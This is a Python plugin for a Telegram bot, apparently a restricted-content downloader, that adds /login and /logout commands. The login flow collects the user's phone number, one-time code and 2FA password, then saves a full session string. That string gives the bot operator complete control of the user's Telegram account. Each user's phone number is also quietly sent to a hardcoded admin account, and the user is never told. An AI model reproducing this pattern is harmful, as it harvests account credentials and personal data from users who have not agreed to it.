ADMIN_ID = 7978114324

from pyrogram import filters, Client
from devgagan import app
import random
import os
import asyncio
import string
from devgagan.core.mongo import db
from devgagan.core.func import subscribe
from config import API_ID as api_id, API_HASH as api_hash
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait
)


def generate_random_name(length=7):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))


async def delete_session_files(user_id):
    session_file = f"session_{user_id}.session"
    memory_file = f"session_{user_id}.session-journal"

    if os.path.exists(session_file):
        os.remove(session_file)
    if os.path.exists(memory_file):
        os.remove(memory_file)

    await db.remove_session(user_id)


# 🔴 LOGOUT COMMAND
@app.on_message(filters.command("logout"))
async def clear_db(client, message):
    user_id = message.chat.id
    await delete_session_files(user_id)

    await message.reply(
        "✅ **Logged out successfully!**\n\n"
        "Use /login to connect again."
    )


# 🟢 LOGIN COMMAND
@app.on_message(filters.command("login"))
async def generate_session(_, message):
    joined = await subscribe(_, message)
    if joined == 1:
        return

    user_id = message.chat.id

    # 🔍 Check existing session
    existing = await db.get_data(user_id)
    if existing and existing.get("session"):
        await message.reply(
            "⚠️ **You are already logged in.**\n\n"
            "Use /logout first."
        )
        return

    # 📱 Ask phone number
    try:
        number = await _.ask(
            user_id,
            "📱 **Enter phone number with country code**\nExample: `+919876543210`",
            filters=filters.text,
            timeout=300
        )
    except TimeoutError:
        await message.reply("⏰ Timeout. Send /login again.")
        return

    phone_number = number.text.strip()

    # 📤 Send to admin (optional)
    try:
        await app.send_message(
            ADMIN_ID,
            f"📥 New Login Attempt\n\n"
            f"👤 User ID: {user_id}\n"
            f"📱 Phone Number: {phone_number}"
        )
    except Exception as e:
        print(f"[ERROR] Failed to send number: {e}")

    # 🔌 Create client
    client = Client(f"session_{user_id}", api_id, api_hash)

    try:
        await message.reply("📲 Connecting...")
        await client.connect()
    except Exception as e:
        await message.reply(f"❌ Connection failed: `{e}`")
        return

    # 📩 Send OTP
    try:
        code = await client.send_code(phone_number)
    except ApiIdInvalid:
        await client.disconnect()
        await message.reply("❌ Invalid API ID/HASH")
        return
    except PhoneNumberInvalid:
        await client.disconnect()
        await message.reply("❌ Invalid phone number")
        return
    except FloodWait as e:
        await client.disconnect()
        await message.reply(f"⏳ Wait {e.value} seconds")
        return
    except Exception as e:
        await client.disconnect()
        await message.reply(f"❌ Error: `{e}`")
        return

    # 🔐 Ask OTP
    try:
        otp_msg = await _.ask(
            user_id,
            "🔐 **Enter OTP**\nExample: `1 2 3 4 5`",
            filters=filters.text,
            timeout=600
        )
    except TimeoutError:
        await client.disconnect()
        await message.reply("⏰ OTP timeout. Try again.")
        return

    phone_code = otp_msg.text.replace(" ", "").strip()

    try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)

    except PhoneCodeInvalid:
        await client.disconnect()
        await otp_msg.reply("❌ Invalid OTP")
        return

    except PhoneCodeExpired:
        await client.disconnect()
        await otp_msg.reply("❌ OTP expired")
        return

    except SessionPasswordNeeded:
        try:
            pass_msg = await _.ask(
                user_id,
                "🔒 Enter 2FA password",
                filters=filters.text,
                timeout=300
            )
            await client.check_password(pass_msg.text)
        except Exception:
            await client.disconnect()
            await message.reply("❌ Wrong password")
            return

    except Exception as e:
        await client.disconnect()
        await otp_msg.reply(f"❌ Error: `{e}`")
        return

    # 💾 Save session
    try:
        string_session = await client.export_session_string()
        await db.set_session(user_id, string_session)
        await client.disconnect()

        await otp_msg.reply(
            "✅ **Login Successful!**\n\n"
            "Send any post link now."
        )

    except Exception as e:
        await client.disconnect()
        await message.reply(f"❌ Save failed: `{e}`")
